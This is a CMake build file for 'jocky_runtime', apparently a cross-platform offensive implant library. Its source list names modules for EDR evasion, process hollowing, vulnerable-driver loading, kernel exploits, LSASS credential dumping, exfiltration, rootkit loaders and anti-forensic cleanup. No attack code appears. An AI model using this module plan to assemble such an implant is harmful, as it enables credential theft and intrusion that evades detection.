cmake_minimum_required(VERSION 3.16)
project(jocky_runtime C CXX)

set(CMAKE_C_STANDARD 11)
set(CMAKE_CXX_STANDARD 14)

# Runtime source files
set(RUNTIME_SOURCES
    init/anti_analysis.c
    util/mem.c
    evasion/unhook.c
    evasion/syscalls.c
    evasion/stack_spoof.c
    evasion/trusted_spoof.c
    evasion/edrhoker.c
    evasion/advanced_edr.c
    windows/evasion/edr_throttle_profiler.c
    execution/hollow.c
    execution/linux_hollow.c
    execution/inmem.c
    execution/byovd.c
    execution/driver_interact.c
    execution/linux_modules.c
    exploitation/kernel_exploit.c
    exploitation/linux_kernel.c
    exfil/exfil.c
    exfil/lsass_dump.c
    cleanup/self_delete.c
    cleanup/logs.c
    cleanup/forensics.c
    pack/stub_loader.c
    io/io.c
    memory/vmem.c
    registry/registry.c
    byovd/driver_scoring.c
    byovd/byovd_manifest.c
    byovd/byovd_modular.c
    linux/syscall.c
    linux/sysinfo_syscall.c
    linux/process_syscall.c
    linux/env_syscall.c
    linux/file_syscall.c
    linux/dir_syscall.c
    linux/mem_syscall.c
    linux/signal_syscall.c
    linux/process_control_syscall.c
    linux/ipc_syscall.c
    linux/util_syscall.c
    linux/kernel/lkm_loader.c
    linux/kernel/lkm_loader.cpp
    linux/kernel/ebpf_loader.c
    linux/kernel/ebpf_evasion.cpp
    linux/kernel/ftrace_helper.c
    linux/kernel/ftrace_hooking.cpp
    linux/kernel/modules.c
    linux/kernel/advanced_syscalls.c
    linux/kernel/advanced_kernel_ops.c
    linux/anti_analysis/artifact_hiding.cpp
    linux/anti_analysis/userland_evasion.cpp
    linux/lpe/privilege_escalation.cpp
    linux/lpe/fence2pwn.c
    linux/process/hollow.c
    linux/process/process_syscall.c
    linux/process/process_control_syscall.c
    linux/process/advanced_process_ops.c
    linux/networking/network.c
    linux/forensics/linux_forensics.c
    ai/mutation_engine.c
)

# Platform-specific filtering
if(NOT WIN32)
    # Remove Windows-only sources on Linux (keep linux_hollow.c, linux_modules.c)
    list(REMOVE_ITEM RUNTIME_SOURCES
        evasion/unhook.c
        evasion/syscalls.c
        evasion/stack_spoof.c
        evasion/trusted_spoof.c
        execution/hollow.c
        execution/inmem.c
        execution/byovd.c
        execution/driver_interact.c
        exploitation/kernel_exploit.c
        exfil/exfil.c
        exfil/lsass_dump.c
        cleanup/forensics.c
        pack/stub_loader.c
        registry/registry.c
    )
endif()

# Static library
add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
target_include_directories(jocky_rt PUBLIC include)

if(WIN32)
    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
else()
    # Linux: link against libdl for dlopen/dlsym
    target_link_libraries(jocky_rt PUBLIC dl)
endif()

# Example: build a test executable
# add_executable(rt_test tests/rt_test.c)
# target_link_libraries(rt_test jocky_rt)
